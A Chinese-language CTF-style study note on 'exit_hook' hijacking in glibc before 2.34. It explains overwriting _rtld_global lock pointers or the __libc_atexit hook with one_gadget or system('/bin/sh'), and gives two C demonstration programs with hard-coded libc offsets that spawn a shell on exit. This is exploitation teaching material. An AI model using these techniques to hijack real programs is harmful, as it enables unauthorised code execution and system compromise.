# exit_hook劫持

`glibc-2.34`之前

## 四种方式

修改`_rtld_global._dl_rtld_lock_recursive`为`one_gadget`
修改`_rtld_global._dl_rtld_unlock_recursive`为`one_gadget`
修改`_rtld_global._dl_rtld_lock_recursive`为`system`和`_rtld_global._dl_load_lock`为`/bin/sh`
修改`_rtld_global._dl_rtld_unlock_recursive`为`system`和`_rtld_global._dl_load_lock`为`/bin/sh`

调用exit即可触发漏洞

## 示例

```C
// 修改`_rtld_global._dl_rtld_lock_recursive`为`system`和`_rtld_global._dl_load_lock`为`/bin/sh`
#include <stdio.h>
#include <stdlib.h>

char *binsh = "/bin/sh";

int main(void)
{
    /* 寻找地址 */

    // p/x &system-$libc
    char *libc_base = ((char *)(&system) - 0x52290);

    // p/x &_rtld_global._dl_rtld_lock_recursive
    // p/x &_rtld_global._dl_rtld_unlock_recursive
    size_t *rtld_lock_default_lock_recursive = (size_t *)(libc_base + 0x228f68);

    // p &_rtld_global._dl_load_lock
    size_t *dl_load_lock = (size_t *)(libc_base + 0x228968);

    /* 修改地址 */
        
    // 设置 rtld_lock_default_lock_recursive 为 system
    *rtld_lock_default_lock_recursive = (size_t)&system;

    // 设置 _dl_load_lock 为 /bin/sh
    *dl_load_lock = *(size_t*)binsh;

    exit(1);
    return 0;
}
```

## exit_hook+

通过`exit()->__run_exit_handlers()`中的`HOOK`如下:

```C
  if (run_list_atexit)
    RUN_HOOK (__libc_atexit, ());
```

但是2.35后面的版本不可写，之前的版本更新后也不可写，可以通过`gdb`动调查看`__libc_atexit`是否可写

```C
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    // p/x &system-$libc
    char *libc_base = ((char *)(&system) - 0x55410);
    // IDA进入exit函数后，查找_exit的交叉引用中含有exit的__run_exit_handlers的地方，找到函数指针的地址
    size_t* hook = libc_base + 0x1ED608;
    // 设置函数指针的地址为one_gadget的地址
    *hook = (size_t)(libc_base + 0xe6aee);
    // 触发
    exit(1);
    return 0;
}
```

### 寻找__libc_atexit

`IDA`进入`exit`函数后，查找`_exit`的交叉引用中含有`exit`的`__run_exit_handlers`的地方，找到函数指针的地址
